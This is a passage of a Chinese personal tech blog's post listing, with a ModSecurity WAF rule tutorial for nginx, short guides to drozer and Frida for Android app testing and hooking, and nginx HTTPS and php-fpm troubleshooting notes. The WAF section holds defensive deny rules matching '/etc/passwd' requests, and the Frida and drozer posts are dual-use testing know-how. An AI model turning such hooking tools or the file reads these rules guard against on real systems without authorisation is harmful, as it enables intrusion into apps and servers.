<span class="nx">Include</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">nginx</span><span class="o">/</span><span class="nx">modsec</span><span class="o">/</span><span class="nx">modsecurity</span><span class="p">.</span><span class="nx">conf</span>
<span class="nx">SecRule</span> <span class="nx">ARGS</span><span class="p">:</span><span class="nx">url</span> <span class="dl">"</span><span class="s2">@contains admin</span><span class="dl">"</span> <span class="dl">"</span><span class="s2">id:2234,deny,log,status:403</span><span class="dl">"</span>
<span class="c1">//在访问url内传输给url这个参数中存在admin字样进行拦截，并记录。    </span>
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>报错：
        <ul>
          <li>
            <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">报错解决</span><span class="err">：</span><span class="p">[</span><span class="nx">emerg</span><span class="p">]</span> <span class="dl">"</span><span class="s2">modsecurity_rules_file</span><span class="dl">"</span> <span class="nx">directive</span> <span class="nx">Rules</span> <span class="nx">error</span><span class="p">.</span>
  <span class="nx">vim</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">nginx</span><span class="o">/</span><span class="nx">modsec</span><span class="o">/</span><span class="nx">modsecurity</span><span class="p">.</span><span class="nx">conf</span>
  <span class="nx">注释掉下面配置语句</span>
  <span class="err">#</span><span class="nx">SecUnicodeMapFile</span> <span class="nx">unicode</span><span class="p">.</span><span class="nx">mapping</span> <span class="mi">20127</span>
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>配置成功SERVER区块：
        <ul>
          <li>
            <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">server</span> <span class="p">{</span>
          <span class="nx">listen</span>       <span class="mi">8077</span><span class="p">;</span>
          <span class="nx">server_name</span>  <span class="nx">localhost</span><span class="p">;</span>
  	    <span class="nx">modsecurity</span> <span class="nx">on</span><span class="p">;</span>
          <span class="nx">modsecurity_rules_file</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">nginx</span><span class="o">/</span><span class="nx">modsec</span><span class="o">/</span><span class="nx">main</span><span class="p">.</span><span class="nx">conf</span><span class="p">;</span>
          <span class="err">#</span><span class="nx">charset</span> <span class="nx">koi8</span><span class="o">-</span><span class="nx">r</span><span class="p">;</span>
            
          <span class="err">#</span><span class="nx">access_log</span>  <span class="nx">logs</span><span class="o">/</span><span class="nx">host</span><span class="p">.</span><span class="nx">access</span><span class="p">.</span><span class="nx">log</span>  <span class="nx">main</span><span class="p">;</span>
            
          <span class="nx">location</span> <span class="o">/</span> <span class="p">{</span>
              <span class="nx">root</span>   <span class="nx">html</span><span class="p">;</span>
              <span class="nx">default_type</span> <span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">;</span>
              <span class="k">return</span> <span class="mi">200</span> <span class="dl">"</span><span class="s2">Thank you for requesting ${request_uri}</span><span class="se">\n</span><span class="dl">"</span><span class="p">;</span>
              <span class="err">#</span><span class="nx">index</span>  <span class="nx">index</span><span class="p">.</span><span class="nx">html</span> <span class="nx">index</span><span class="p">.</span><span class="nx">htm</span><span class="p">;</span>
              <span class="nx">proxy_set_header</span> <span class="nx">Host</span> <span class="nx">$host</span><span class="p">;</span>
          <span class="p">}</span>
            
          <span class="nx">error_page</span>  <span class="mi">404</span> <span class="mi">403</span> <span class="mi">405</span>              <span class="o">/</span><span class="mi">403</span><span class="p">.</span><span class="nx">html</span><span class="p">;</span>
  	    <span class="nx">location</span> <span class="o">=</span> <span class="sr">/403.html </span><span class="err">{
</span>  	        <span class="nx">root</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">nginx</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="mi">403</span> <span class="p">;</span>
  	<span class="p">}</span>

</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>WAF防护效果图：
        <ul>
          <li><img src="/assets/img/blog/2019/WAF-DENY-TEST.PNG" alt="WAF-DENY-TEST" /></li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p>如无法测试成功可参考以下链接：</p>
<blockquote>
  <p><a href="https://zhuanlan.zhihu.com/p/80866123">《手把手带你搭建企业级WEB防火墙ModSecurity3.0+Nginx》</a></p>

  <p><a href="https://www.freebuf.com/sectool/211354.html">《ModSecurity：一款优秀的开源WAF》</a></p>
</blockquote>

<p><strong>添加于2021/02/05</strong></p>

<h2 id="3规则库配置">3.规则库配置</h2>

<p>我们从上面得到：</p>

<ul>
  <li>main.conf配置文件自写规则库：
    <ul>
      <li>测试：
        <ul>
          <li>
            <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">Include</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">nginx</span><span class="o">/</span><span class="nx">modsec</span><span class="o">/</span><span class="nx">modsecurity</span><span class="p">.</span><span class="nx">conf</span>
  <span class="nx">SecRule</span> <span class="nx">ARGS</span><span class="p">:</span><span class="nx">url</span> <span class="dl">"</span><span class="s2">@contains admin</span><span class="dl">"</span> <span class="dl">"</span><span class="s2">id:2234,deny,log,status:403</span><span class="dl">"</span>
  <span class="c1">//在访问url内传输给url这个参数中存在admin字样进行拦截，并记录。</span>
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>当然也可以发散思维，禁止参数传入/etc/passwd等，此处权当抛砖引玉</li>
    </ul>
  </li>
</ul>

<p>我们在安全开发的过程中若需要自写规则库进行WEB防御，可参考：</p>

<table class="table">
  <thead>
    <tr>
      <th>自写规则库定义一览</th>
      <th> </th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>REQUEST_LINE</td>
      <td>代表整个请求行</td>
      <td><code class="language-plaintext highlighter-rouge">SecRule REQUEST_LINE "!(^((?:(?:POS|GE)T|HEAD))|HTTP/(0\.9|1\.0|1\.1)$)" "phase:1,id:49,log,block,t:none"</code></td>
      <td>#该规则表示，仅允许请求方式为POST，GET以及HEAD，同时请求协议也仅允许为HTTP0.9/1.0/1.1</td>
    </tr>
    <tr>
      <td>REQUEST_METHOD</td>
      <td>代表请求方式</td>
      <td><code class="language-plaintext highlighter-rouge">SecRule REQUEST_METHOD "^(?:PUT|CONNECT|TRACE|DELETE)$" "phase:1,id:49,log,block,t:none"</code></td>
      <td>#该规则表示，如果请求方式是PUT、CONNECT、TRACE、DELETE的任意一种方式，则拦截此次访问</td>
    </tr>
    <tr>
      <td>REQUEST_PROTOCOL</td>
      <td>代表请求协议&amp;版本</td>
      <td><code class="language-plaintext highlighter-rouge">SecRule REQUEST_PROTOCOL "!^HTTP/(0\.9|1\.0|1\.1)$" "phase:1,id:50,log,block,t:none"</code></td>
      <td>#该规则表示，如果访问协议不是HTTP，同时协议版本也不是0.9/1.0/1.1的话，拦截此次访问</td>
    </tr>
    <tr>
      <td>REQUEST_URI</td>
      <td>代表包含查询字符串数据在内的完整请求URL</td>
      <td><code class="language-plaintext highlighter-rouge">SecRule REQUEST_URI "attack" "phase:1,id:52,t:none,t:urlDecode,t:lowercase,t:normalizePath"</code></td>
      <td>#该规则表示，如果请求URL中包含attack字符串，则拦截此次访问</td>
    </tr>
    <tr>
      <td>REQUEST_FILENAME</td>
      <td>代表不包含查询字符串数据在内的相对请求URL</td>
      <td><code class="language-plaintext highlighter-rouge">SecRule REQUEST_FILENAME "/etc/passwd" "phase:1,id:53,log,block,t:none"</code></td>
      <td>#该规则表示，如果请求URL(不含传入参数)包含etc/passwd字符串，则拦截此次访问</td>
    </tr>
    <tr>
      <td>REQUEST_HEADERS</td>
      <td>代表所有请求头的集合，也可以用于检查所指定的请求头内容（通过使用REQUEST_HEADERS:Header-Name语法）</td>
      <td><code class="language-plaintext highlighter-rouge">SecRule REQUEST_HEADERS:Host "^[\d\.]+$" "deny,id:47,log,status:403"</code></td>
      <td>#该规则表示，如果请求头中的HOST字段的内容为IP地址的话，则使用deny动作拒绝此次访问，同时向客户端返回403错误</td>
    </tr>
  </tbody>
</table>

<p>效果图：
<img src="/assets/img/blog/2019/WAF-PASSWD-DENY.PNG" alt="WAF-PASSWD-DENY" /></p>

<p>参考：</p>

<blockquote>
  <p><a href="http://www.modsecurity.cn/chm/Variables.html">ModSecurity中文手册</a></p>
</blockquote>

<h2 id="4总结">4.总结</h2>

<p>原文大量篇幅写的是代码的配置问题，后期修改后删除了大部分，有兴趣的可以看上面的第二个链接；</p>

<p>这一块，其实跟着原教程走了一个弯，这里原作者在教程中应用的是反向代理，我们可以通过以上成功的SERVER配置块了解到其实直接链接WAF让规则库生效即可。</p>

<hr />

<p>以上。</p>


          <p><a href="/blog/2019/ABOUT/Modsec/waf/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/Drozer/Scan/in/android/"><h3 class="ctitle">「安卓渗透」:Amazing drozer Scanning frame</h3></a>
          <p><csmall>Dec 18, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>
    <p>直接上链接，不多bb。有空写实战：）</p>

    <ul>
      <li>参考文档：<br /></li>
      <li><a href="https://segmentfault.com/a/1190000003756601"> 安卓渗透框架－Drozer架构浅析–架构组成和自定义模块 </a></li>
    </ul>
  </li>
</ul>

<h2 id="一drozer运行概述">一、drozer运行概述</h2>
<p>跟Frida-Hook框架运行模式差不多，均为C/S模式。</p>
<ul>
  <li>1）移动端：drozer-agent启动pc-drozer框架前需打开drozer-agent进行端口转发</li>
  <li>2）pc端：主要控制CLI端。渗透测试命令全部在这里输入执行；</li>
</ul>

<h3 id="11-drozer环境">1.1 drozer环境</h3>
<ul>
  <li>windows/linux-debian</li>
  <li>python2.7</li>
  <li>drozer&amp;drozer-angent</li>
</ul>

<h3 id="12-前期准备">1.2 前期准备</h3>
<p><a href="https://github.com/mwrlabs/drozer/releases/download/2.4.4/drozer-2.4.4.win32.msi">windows-drozer-2.4.4.msi下载</a><br />
<a href="https://github.com/mwrlabs/drozer/releases/download/2.4.4/drozer_2.4.4.deb">debian-linux-drozer-2.4.4.deb下载</a><br />
<a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">android-drozer-2.3.4.apk下载</a><br /></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>多提一句：
msi后缀为windows可执行文件，双击安装即可。
deb：dpkg -i &lt;deb包&gt;
apk是安卓包，下载到本地&lt;adb install apk包&gt;
</code></pre></div></div>

<h2 id="二drozer实战">二、drozer实战</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\本阿信&gt;drozer console connect
Selecting 7ad839637216ad27 (OPPO OPPO R11 Plus 5.1.1)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.4.4)
dz&gt;
</code></pre></div></div>

<h3>updating～</h3>


          <p><a href="/blog/2019/Drozer/Scan/in/android/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/Android/hook/"><h3 class="ctitle">「安卓渗透」： Let's hook APK with frida～</h3></a>
          <p><csmall>Dec 15, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>忙里偷闲，本文是记录Hook-Frida框架，如何使用Frida注入代码，做到对安卓apk进行代码hook注入。</li>
</ul>

<h2 id="frida框架准备">Frida框架准备</h2>
<p>1.frida框架安装<br />
frida框架为C/S模式，即客户端、服务端模式：<br /></p>
<ul>
  <li>1）一部分是运行在客户端上的命令行交互工具：Frida CLI。<br /></li>
  <li>2）另一部分是运行在目标机器（服务端，在本文中则是安卓手机）上的代码注入：frida-server。<br />
过程为：你在电脑上进行frida控制，开启目标机器（服务端）上的server端后，我们可以一些自定义操作比如指定hook脚本，这些参数通过客户端发送到服务端，服务端接收参数后来进行操作<br /></li>
</ul>

<p>2.一个测试apk<br /></p>

<p>3.<code class="language-plaintext highlighter-rouge">hook代码</code>(此处hook代码不便贴出，见谅)</p>

<h3 id="安装frida">安装Frida</h3>
<p>这里Frida支持python3和python2.7，因为确实3和2.7之间还是有不同的地方，本文以python2.7安装Frida为例：<br />
查看pip版本</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip --version
pip 18.1 from /usr/lib/python2.7/dist-packages/pip (python 2.7)
##你想在哪个环境下运行Frida，就用哪个命令（pip、pip3）
pip3 --version
pip 18.1 from /usr/lib/python3/dist-packages/pip (python 3.7)
</code></pre></div></div>
<p>确认是在2.7版本环境下安装即可：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install frida
Collecting frida
    Downloading https://files.pythonhosted.org/packages/38/1b/8a462787cedda36c57227ed0babbd80c4c4cc5bc9c1f9b5aa285ed6aebba/frida-12.8.0.tar.gz
Building wheels for collected packages: frida
  Running setup.py bdist_wheel for frida ... \
  Successfully built frida
Installing collected packages: frida
Successfully installed frida-12.8.0
</code></pre></div></div>
<p>安装完frida，继续安装依赖项：frida-tools：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install frida-tools
	100% |████████████████████████████████| 348k
</code></pre></div></div>
<p>此处基本frida框架就安装完成了，查看一下frida的版本号</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frida --version
12.8.0
</code></pre></div></div>

<h3 id="安装frida-server">安装frida-server</h3>
<p>此处安装的是Frida的服务端，在手机端运行。手机端大多为<code class="language-plaintext highlighter-rouge">ARM</code>架构，但有的小伙伴使用的模拟器，所以先用命令查看一下手机的cpu架构：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb shell
* daemon not running; starting now at tcp:5037
* daemon started successfully
shell@angler:/ $ su
root@angler:/ # getprop ro.product.cpu.abi
arm64-v8a
</code></pre></div></div>
<p>如果回显是<code class="language-plaintext highlighter-rouge">arm</code>就下载arm版本，回显<code class="language-plaintext highlighter-rouge">x86</code>就下载x86版本。
<a href=" https://github.com/frida/frida/releases">frida-server下载</a><br />
这里记住千万不要下载错了，进去页面直接<code class="language-plaintext highlighter-rouge">CTRL+F</code>搜索server。下载完毕，重命名为frida-server<br />
把frida-server传输到手机，（注意：pc端frida版本号与移动端一致）：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##PC端
adb devices
adb push frida-server /data/local/tmp
adb forward tcp:27042 tcp:27042
adb forward tcp:27043 tcp:27043
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##移动端
adb shell
root@angler:/data/local/tmp # cd /data/local/tmp/ 
root@angler:/data/local/tmp #./frida-server
</code></pre></div></div>

<h2 id="frida-hook实战">Frida-Hook实战</h2>
<p>在启动服务端frida-server后，在客户端进行操作：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##指定好pack包和js文件路径
frida -U -f &lt;package-name&gt; -l &lt;hook.js-path&gt;
##提示&lt;package-name&gt;Spawned成功后，输入%resume重启app后使app-hook注入
</code></pre></div></div>
<p><img src="/assets/img/post-pic/post-frida-pic2.png" alt="" /> <br />
如下图，app重启后检测到hook框架代码弹出提示，此时js代码注入成功。<br />
<img src="/assets/img/post-pic/post-frida-pic3.png" alt="" /></p>

<h2>以上为敬。</h2>

<p>参考文档：
<a href="https://www.jianshu.com/p/c349471bdef7">Frida详细安装教程</a></p>

          <p><a href="/blog/2019/Android/hook/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/how-nginx/http2https/"><h3 class="ctitle">「笔记」NGINX：http升级https协议</h3></a>
          <p><csmall>Dec 7, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p><strong>窈窕HTTPS，正是TCP的好逑；</strong></p>

<p>how to used http to https with nginx?is’s sounds fantastic!</p>

<blockquote>
  <p>其实证书早就颁发下来了，一直配置配不成功（小声bb）。纪念一下，2019-12-13号，chihou.pro升级为https协议。嘿嘿</p>
</blockquote>

<h2 id="1安装libssl库">1.安装libssl库</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install libssl-dev
apt-get install libpcre3 libpcre3-dev
</code></pre></div></div>

<h2 id="2ssl编译">2.ssl编译</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd nginx/ 
./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module --with-file-aio --with-http_realip_module
make 
如果安装了nginx，到这里结束。
反之再加
make install
cd #你解压nginx的目录/sbin/
./nginx -V
nginx -V #注意是大v，看到下面有--with-http_ssl_module模块即可
nginx version: nginx/1.16.1
built with OpenSSL 1.1.1d  10 Sep 2019
TLS SNI support enabled
configure arguments: --with-cc-opt='-g -O2 --with-http_ssl_module 
cp nginx /usr/sbin
复制到快速启动目录即可
</code></pre></div></div>

<h2 id="3认证配置">3.认证配置</h2>

<p>证书申请下来后把证书传到服务器上就行了，配置nginx的https区块即可。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http{
server {
    listen 443;
    server_name XXX;
    ssl on;
    ssl_certificate    /usr/local/nginx/conf/cert/214.pem;#你自己的证书地址
    ssl_certificate_key   /usr/local/nginx/conf/cert/21.key;
    ssl_session_timeout 5m;
    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    ssl_prefer_server_ciphers on;    
    
    location / { 
        
	    }      
	}
}

nginx -t 
systemctl reload nginx
</code></pre></div></div>

<h2 id="amazingits-failed">AMAZING:it’s failed</h2>
<p>配置完美滋滋去验证网站，畏（zhi）畏（gao）缩（qi）缩（ang）的输入<code class="language-plaintext highlighter-rouge">https://www.chihou.pro</code>，结果傻了眼，还是http的协议提示，好气。<br />
<img src="/assets/img/post-bg/post-unsafe-http.png" alt="" /></p>

<p>赶紧趁着ssh还没断开赶紧查看配置哪里出了问题。
思路：因为配置了ssl，监听了443端口。所以服务器肯定在监听了443端口，先查查看：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstatus -tunlp |grep 443#发现没有回显，那看看所有监听服务器
netstatus -tunlp#（仅仅展示一部分）发现服务器并未监听443
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      861/nginx: master p 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      319/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      6029/sshd           
</code></pre></div></div>
<p>如上代码，nginx配置了监听443,，实际上linux却没有监听，问题肯定就出在这上面<br />
首先排除：nginx配置问题，因为nginx配置是能够通过的，所以暂时排除。<br />
第二就是防火墙的问题，先登上控制台确认443端口开放，没问题。然后登上服务器查看服务器防火墙状态，因为是ubuntu服务器所有查看ufw状态：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl status ufw
● ufw.service - Uncomplicated firewall
   Loaded: loaded (/lib/systemd/system/ufw.service; enabled; vendor preset: enabled)
   Active: active (exited) since Fri 2019-12-13 10:46:00 CST; 1h 54min ago
     Docs: man:ufw(8)
  Process: 31826 ExecStop=/lib/ufw/ufw-init stop (code=exited, status=0/SUCCESS)
  Process: 31967 ExecStart=/lib/ufw/ufw-init start quiet (code=exited, status=0/SUCCESS)
 Main PID: 31967 (code=exited, status=0/SUCCESS)

Dec 13 10:46:00 iZj6cgn7odv59wmjjhe6zwZ systemd[1]: Starting Uncomplicated firewall...
Dec 13 10:46:00 iZj6cgn7odv59wmjjhe6zwZ systemd[1]: Started Uncomplicated firewall.

</code></pre></div></div>
<p>看到服务器防火墙是active状态，但是接下来却让我<code class="language-plaintext highlighter-rouge">目瞪口呆</code>：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ufw status verbose
Status: inactive
ufw status numbered
Status: inactive
</code></pre></div></div>
<p>不管怎么写命令，他都是提示incative，我瞬间就崩溃了，我甚至还尝试了<code class="language-plaintext highlighter-rouge">systemctl status verbose ufw</code>这样的蠢命令- -|||
后来各种查命令，因为我坚信服务器上还有第二个防火墙～<br />理由：控制台开放了443，而我进行验证却验证失败：
<code class="language-plaintext highlighter-rouge">telnegt $IP 443</code>反馈：<code class="language-plaintext highlighter-rouge">telnet: Unable to connect to remote host: Connection refused</code>，所以我就一直钻到<code class="language-plaintext highlighter-rouge">防火墙</code>的牛角尖出不来了。
兜兜转转，圈圈圆圆。所以就一直拖到了今天TAT</p>

<h2 id="it-can-be-solved">It can be solved.</h2>
<p>后来证实其实问题不是在防火墙上，今天偶然网上冲浪，看到个帖子:<br /></p>
<div class="default"><a href="https://www.cnblogs.com/lxwphp/p/8031919.html">nginx https配置后无法访问，可能防火墙在捣鬼</a></div>
<p>(建议右键新建页面打开～<code class="language-plaintext highlighter-rouge">笔芯</code>)，引用文章的话:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>如果无法连接，通常是防火墙，或者nginx为(未)(我真是个天才)启动等可能的因素；
冷静分析问题，查看错误信息，才是解决问题的办法
</code></pre></div></div>
<p>联想到我的问题，难道？是nginx根本没有重启？一语惊醒梦中人。赶紧登上服务器。
既然<code class="language-plaintext highlighter-rouge">systemctl</code>没用，那直接用nginx配置命令</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nginx -s reload
</code></pre></div></div>
<p>输入<code class="language-plaintext highlighter-rouge">chihou.pro</code>-键入<code class="language-plaintext highlighter-rouge">F5</code><br />
她居然跳转了<code class="language-plaintext highlighter-rouge">https</code>页面，我哭了。</p>

<h5>冷静分析问题，查看错误信息，才是解决问题的办法</h5>
<h5>解决问题的办法</h5>
<h5>办法</h5>
<h5>法</h5>
<h5>奥利给～</h5>
<h5>给...</h5>

<p>如果这篇文章帮助到了您，那不如在心里大大喊一声<code class="language-plaintext highlighter-rouge">nice</code>～<br />
<code class="language-plaintext highlighter-rouge">敬上。感谢您的阅读</code><br />
参考：<br />
<a href="https://www.jianshu.com/p/1ca5a62df1a9">启动Nginx出现Failed to start nginx.service:unit not found</a><br />
<a href="https://blog.csdn.net/weixin_44846959/article/details/89603328">Ubuntu编译安装nginx</a><br />
<a href="https://www.cnblogs.com/zoulixiang/p/10196671.html">nginx 动态添加ssl模块 </a></p>

          <p><a href="/blog/2019/how-nginx/http2https/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/nginx/with/php/404error/"><h3 class="ctitle">「排错」：php-fpm解析404-not found</h3></a>
          <p><csmall>Dec 4, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>php+nginx解析错误，报错404-Not Found</li>
</ul>

<h2 id="前言">前言</h2>
<p>容器内是自己写的个人博客，处于安全考虑用的是静态页面博客。但是由于公网维护博客较为困难，加上之前用的开源存储云服务项目，那么就需要<code class="language-plaintext highlighter-rouge">php</code>来解析，所以打算试一试能不能<code class="language-plaintext highlighter-rouge">「nginx+php」</code>的方式方便个人维护博客。
<br />
所以本菜最终想完成的是这样的：</p>

<ul>
  <li>static html：web blog + dynamic php：store server</li>
  <li>静态博客页面 + 动态php页面传输markdown文件</li>
</ul>

<h2 id="报错现象">报错现象</h2>
<p>nginx容器能够启动，HTML页面能够正常回显，但是解析php页面会报错：404-NOT-FOUND；</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi index.php
&lt;?php
phpinfo();
?&gt;
</code></pre></div></div>
<p>看到比我头还大的404头就疼；确定各种php的配置都没错。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {
location ~ \.php{
	    index  indx.php index.html;
	    include snippets/fastcgi-php.conf;
	    fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
		}
}
</code></pre></div></div>
<p>就各种上网搜php-404，问人。都没答案。</p>

<h2 id="排错过程">排错过程</h2>

<h4 id="幡然悔悟">幡然悔悟</h4>
<p>正好最近薅了一个华为云服务器，反手就是nginx+php存储项目往上安装方便传输文件，配nginx的时候看到这么一行配置：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##
# Virtual Host Configs
##
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
</code></pre></div></div>
<p>直拍大腿，当初配博客服务器的时候，嫌麻烦，直接把<code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>这行配置注释掉了，自己在http区块配了php-location-server。赶紧重新配置php-fpm：</p>

<blockquote>
  <p>传送门：「移植」ubuntu with arm.公网存储容器搭建记录 http://www.chihou.pro/2019/11/10/Ubuntu-linux-with-arm/</p>
</blockquote>

<h4 id="茅塞顿开">茅塞顿开</h4>

<p>重新软链接完php-fpm，迫不及待访问php文件，又报错：</p>
<center><strong>502：Bad-Gateway</strong></center>
<p>舒了一口气，总算不是该死的404了。502报错基本上就是php-fpm的配置问题了，一般都是fpm在解析时出错。反手查看一波php运行日志：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /var/log/php7.2-fpm.log
[04-Dec-2019 17:58:14] NOTICE: ready to handle connections
[04-Dec-2019 17:58:14] NOTICE: systemd monitor interval set to 10000ms
</code></pre></div></div>

<p>果然，php-fpm解析超时了导致报错，直接搜索解决答案；</p>

<h4 id="迎刃而解">迎刃而解</h4>

<p>在php-fpm配置文件下加入fpm运行参数:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi /etc/php/7.2/fpm/php-fpm.conf
;;;;;;;;;;;;;;;;;;
; Global Options ;
;;;;;;;;;;;;;;;;;;
pm.max_children = 50
pm.start_servers = 15
pm.min_spare_servers = 10
pm.max_spare_servers = 40 
systemctl reload php-fpm
</code></pre></div></div>

<p>同时对nginx增加配置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi /etc/nginx/nginx.conf
http {

fastcgi_connect_timeout 300;
fastcgi_send_timeout 300;
fastcgi_read_timeout 300;

} 
nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
测试无误
</code></pre></div></div>

<p>访问index.php，终于看到了熟悉的<code class="language-plaintext highlighter-rouge">phpinfo</code>页面，至此排错、配置结束。</p>

<hr />

<p>2020-02-20更新：</p>

<p>在linux下配置好nginx和php-fpm后，访问web页面不能显示，查看nginx访问日志，日志显示返回200，访问成功。
html静态页面没问题，但是php页面总是空白页也没有任何报错，经过查找，发现需要在nginx中加入一句话</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
</code></pre></div></div>
<p>安装完nginx后默认的fastcgi_params配置文件中没有上面这句话。</p>

<p>在nginx.conf中的</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location ~ .php<span class="nv">$ </span><span class="o">{</span>
root html<span class="p">;</span>
fastcgi_pass 127.0.0.1:9000<span class="p">;</span>
fastcgi_index index.php<span class="p">;</span>
<span class="c">#fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;</span>
fastcgi_param SCRIPT_FILENAME <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
include fastcgi_params<span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>
<p>或者在fastcgi_params配置文件中加入</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PHP only, required if PHP was built with –enable-force-cgi-redirect</span>
fastcgi_param REDIRECT_STATUS 200<span class="p">;</span>
fastcgi_param SCRIPT_FILENAME <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
</code></pre></div></div>
<p>然后重启nginx就可以显示出页面了。</p>

<p>nginx下运行php文件时返回200访问空白页：
https://blog.csdn.net/xkweiguang/article/details/52795166</p>

<hr />
<p>502badgateway:</p>

<p>apt自动化安装：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>配置/etc/php/7.3/fpm/pool.d/www.conf文件：
php-fpm.conf: listen <span class="o">=</span> 127.0.0.1:9000
nginx.conf: fastcgi_pass 127.0.0.1:9000<span class="p">;</span>
</code></pre></div></div>
<p>php 502 bad gateway 解决方法：
https://blog.csdn.net/ucmir183/article/details/80240112</p>

<p>以上。</p>
<blockquote>
  <p>= =|||</p>
</blockquote>

